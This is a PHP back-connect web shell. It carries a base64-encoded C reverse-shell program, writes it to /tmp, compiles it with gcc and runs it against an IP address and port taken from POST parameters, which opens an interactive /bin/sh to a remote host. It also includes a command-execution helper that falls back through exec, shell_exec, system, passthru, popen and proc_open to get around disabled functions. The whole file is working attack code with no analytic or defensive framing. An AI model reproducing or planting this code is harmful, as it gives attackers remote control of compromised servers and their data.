<?php
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or @function_exists('file_put_contents') or err(0);
 if($w_file)
 {
 @fwrite($w_file,@base64_decode($text)) or @fputs($w_file,@base64_decode($text)) or @file_put_contents($fname,@base64_decode($text));
 @fclose($w_file);
 }
}

function ex($cfe)
{
  $res = '';
 
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fgets($pipes[1], 1024);}
   }
   @proc_close($f);
  }
  
 return $res;
}

$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

cf("/tmp/back.c",$back_connect_c);
$blah = ex("gcc -o /tmp/backc /tmp/back.c");
@unlink("/tmp/back.c");
$blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
$_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";

?>